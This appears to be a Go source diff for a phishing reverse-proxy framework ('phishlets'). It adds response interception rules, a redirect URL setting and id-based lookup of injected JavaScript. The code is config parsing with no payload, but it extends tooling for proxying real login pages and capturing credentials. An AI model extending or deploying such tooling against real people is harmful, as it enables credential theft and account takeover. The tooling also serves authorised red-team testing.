@@ -90,10 +90,19 @@ type LoginUrl struct {
 }
 
 type JsInject struct {
+	id              string           `mapstructure:"id"`
 	trigger_domains []string         `mapstructure:"trigger_domains"`
 	trigger_paths   []*regexp.Regexp `mapstructure:"trigger_paths"`
 	trigger_params  []string         `mapstructure:"trigger_params"`
 	script          string           `mapstructure:"script"`
+}
+
+type Intercept struct {
+	domain      string         `mapstructure:"domain"`
+	path        *regexp.Regexp `mapstructure:"path"`
+	http_status int            `mapstructure:"http_status"`
+	body        string         `mapstructure:"body"`
+	mime        string         `mapstructure:"mime"`
 }
 
 type Phishlet struct {
@@ -102,6 +111,7 @@ type Phishlet struct {
 	Path             string
 	Author           string
 	Version          PhishletVersion
+	RedirectUrl      string
 	minVersion       string
 	proxyHosts       []ProxyHost
 	domains          []string
@@ -118,6 +128,7 @@ type Phishlet struct {
 	forcePost        []ForcePost
 	login            LoginUrl
 	js_inject        []JsInject
+	intercept        []Intercept
 	customParams     map[string]string
 	isTemplate       bool
 }
@@ -199,8 +210,17 @@ type ConfigJsInject struct {
 	Script         *string   `mapstructure:"script"`
 }
 
+type ConfigIntercept struct {
+	Domain     *string `mapstructure:"domain"`
+	Path       *string `mapstructure:"path"`
+	HttpStatus *int    `mapstructure:"http_status"`
+	Body       *string `mapstructure:"body"`
+	Mime       *string `mapstructure:"mime"`
+}
+
 type ConfigPhishlet struct {
 	Name        string             `mapstructure:"name"`
+	RedirectUrl string             `mapstructure:"redirect_url"`
 	Params      *[]ConfigParam     `mapstructure:"params"`
 	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts"`
 	SubFilters  *[]ConfigSubFilter `mapstructure:"sub_filters"`
@@ -211,6 +231,7 @@ type ConfigPhishlet struct {
 	LandingPath *[]string          `mapstructure:"landing_path"`
 	LoginItem   *ConfigLogin       `mapstructure:"login"`
 	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
+	Intercept   *[]ConfigIntercept `mapstructure:"intercept"`
 }
 
 func NewPhishlet(site string, path string, customParams *map[string]string, cfg *Config) (*Phishlet, error) {
@@ -263,6 +284,7 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 	p.Path = path
 	p.ParentName = ""
 	p.Author = c.GetString("author")
+	p.RedirectUrl = c.GetString("redirect_url")
 	p.Version, err = p.parseVersion(c.GetString("min_ver"))
 	if err != nil {
 		return err
@@ -459,6 +481,38 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 				(*js.TriggerPaths)[n] = p.paramVal((*js.TriggerPaths)[n])
 			}
 			err := p.addJsInject(*js.TriggerDomains, *js.TriggerPaths, js.TriggerParams, p.paramVal(*js.Script))
+			if err != nil {
+				return err
+			}
+		}
+	}
+	if fp.Intercept != nil {
+		for _, ic := range *fp.Intercept {
+			var err error
+			var body, mime string
+			if ic.Domain == nil {
+				return fmt.Errorf("intercept: missing `domain` field")
+			}
+			if *ic.Domain == "" {
+				return fmt.Errorf("intercept: `domain` field cannot be empty")
+			}
+			if ic.Path == nil {
+				return fmt.Errorf("intercept: missing `path` field")
+			}
+			path_re, err := regexp.Compile(*ic.Path)
+			if err != nil {
+				return fmt.Errorf("intercept: `path` invalid regular expression: %v", err)
+			}
+			if ic.HttpStatus == nil {
+				return fmt.Errorf("intercept: missing `http_status` field")
+			}
+			if ic.Body != nil {
+				body = *ic.Body
+			}
+			if ic.Mime != nil {
+				mime = *ic.Mime
+			}
+			err = p.addIntercept(*ic.Domain, path_re, *ic.HttpStatus, body, mime)
 			if err != nil {
 				return err
 			}
@@ -741,7 +795,7 @@ func (p *Phishlet) GetLoginUrl() string {
 	return "https://" + p.login.domain + p.login.path
 }
 
-func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[string]string) (string, error) {
+func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[string]string) (string, string, error) {
 	for _, js := range p.js_inject {
 		host_matched := false
 		for _, h := range js.trigger_domains {
@@ -781,9 +835,25 @@ func (p *Phishlet) GetScriptInject(hostname string, path string, params *map[str
 							script = strings.Replace(script, "{"+k+"}", v, -1)
 						}
 					}
-					return script, nil
+					return js.id, script, nil
 				}
 			}
+		}
+	}
+	return "", "", fmt.Errorf("script not found")
+}
+
+func (p *Phishlet) GetScriptInjectById(id string, params *map[string]string) (string, error) {
+	for _, js := range p.js_inject {
+		if js.id == id {
+			script := js.script
+			if params != nil {
+				for k, v := range *params {
+					script = strings.Replace(script, "{"+k+"}", v, -1)
+				}
+			}
+
+			return script, nil
 		}
 	}
 	return "", fmt.Errorf("script not found")
@@ -901,7 +971,9 @@ func (p *Phishlet) addHttpAuthToken(hostname string, path string, name string, h
 }
 
 func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string, trigger_params []string, script string) error {
-	js := JsInject{}
+	js := JsInject{
+		id: GenRandomToken(),
+	}
 	for _, d := range trigger_domains {
 		js.trigger_domains = append(js.trigger_domains, strings.ToLower(d))
 	}
@@ -919,6 +991,18 @@ func (p *Phishlet) addJsInject(trigger_domains []string, trigger_paths []string,
 	js.script = script
 
 	p.js_inject = append(p.js_inject, js)
+	return nil
+}
+
+func (p *Phishlet) addIntercept(domain string, path *regexp.Regexp, http_status int, body string, mime string) error {
+	ic := Intercept{
+		domain:      strings.ToLower(domain),
+		path:        path,
+		http_status: http_status,
+		body:        body,
+		mime:        mime,
+	}
+	p.intercept = append(p.intercept, ic)
 	return nil
 }
 
